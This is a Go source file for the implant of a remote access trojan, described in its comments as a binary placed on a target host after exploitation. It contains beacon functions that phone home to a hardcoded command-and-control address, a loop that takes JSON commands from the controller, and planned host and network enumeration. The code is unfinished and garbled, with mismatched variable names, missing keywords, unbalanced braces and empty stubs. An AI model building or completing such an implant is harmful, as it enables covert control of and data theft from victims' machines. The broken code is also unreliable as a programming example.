/*/
This is the file that will be compiled into the binary
	that gets placed on the target host
/*/
package target_binary

// import the libraries we need
import (
	"bufio"
	"fmt"

	/*/
	IMPORTING MODULES FROM GOMODCACHE DIRECTORY
		A useful way to make multiple binaries with common code
		- depends on the folder structure and module naming
		- gomodcache is also, invisibly, the pkg directory in the workspace


	/*/
	"go_rat/pkg/Rat_shared_code"
	"net"
	"strings"
)

// Beacons
// TODO: "strange" ways of reaching out
// makes requests outside the network to get to the C&C

//used for reaching out with regular TCP connection, this will hand off to regular connection
// if a "good password *HINT*" is provided
// put the id of the entity connecting to let the host know it's us
func BaconTCP(zombie_ID string) {
	rat_shared_code.PHONEHOME_TCP.IP = net.IP(rat_shared_code.Remote_tcpaddr)
	connection, error := net.DialTCP("tcp", &rat_shared_code.Local_tcpaddr_LAN, &rat_shared_code.PHONEHOME_TCP)
	if err != nil {
			// print the error
			rat_shared_code.Error_printer(err, "[-] Error: TCP Beacon handshake Failed")
			return
		}
		for {
			netData, error := bufio.NewReader(connection).ReadString('\n')

		}
	}
	

// Same for UDP
func BeaconUDP() {

}
func BeaconHTTP() {

}
BeaconDNS(){
	Mdns_server.
}
/*
function to hash a string to compare against the hardcoded password
 never hardcode a password in plaintext
 we use the strongest we can and a good password...

 For the porpoises of this tutorial, we use a weak password.
*/

// function to provide outbound connections via threading
//-----------------Local IP---------Remote IP---------PORT-------
func Tcp_outbound(laddr net.TCPAddr, raddr net.TCPAddr, port int8) {
	// the network functions return two objects
	// a connection
	// and an error
	connection, err := net.DialTCP("tcp", &laddr, &raddr)
	//generic error printing
	// if error isnt empty/null/nothingness
	if err != nil {
		// print the error
		rat_shared_code.Error_printer(err, "[-] Error: TCP Connection Failed")
		return
	}
	// if there was no error, continue to the control loop
	// will be basis of control flow
	// we Assume all communication from the controller to be in json only
	// we are only sending encoded json so we should only react to encoded json
	for {
		netData, error := bufio.NewReader(connection).ReadString('\n')
		// again with the error checking, what are we? Hackers?
		if error != nil {
			fmt.Println(error)
			return
		}
		rat_shared_code.Json_extract(netData)

		}
		//sending wat!?!?
		//connection.Write("asdf")
	}
}

/*
control flow for network operation with tcp protocol
this function will contain the logic to spawn threads
of the following functions

*/
func Tcp_network_io() {

	//generic error printing
	//if err != nil {
	//	fmt.Println(err)
	//	return
	//}

}

// once placed on the target host and executed post exploitation, prefferably with root
/// level permissions, We need to:
//	- send a beacon with a conditional dependant on environment/preference
// 	- run the input/output operations if that environment is right
//  - enumerate host intel, either passively or aggressively
//  - enumerate network information
//  - enumerate further vulnerabilities
//

/*/
A goroutine is a lightweight thread managed by the Go runtime.
	go f(x, y, z)
starts a new goroutine running
	f(x, y, z)
The evaluation of f, x, y, and z happens in the current goroutine and the execution
of f happens in the new goroutine.
Goroutines run in the same address space, so access to shared memory must be synchronized
/*/
func main() {
	if BEACON_ON_START == true{
		switch BACON_TYPE{
			case "tcp":
				go BaconTCP()
			case "udp":
				go BeaconUDP()
			case "http":
				go BeaconHTTP()
	}
	}
	rat_shared_code.GetTCPConnections()
}
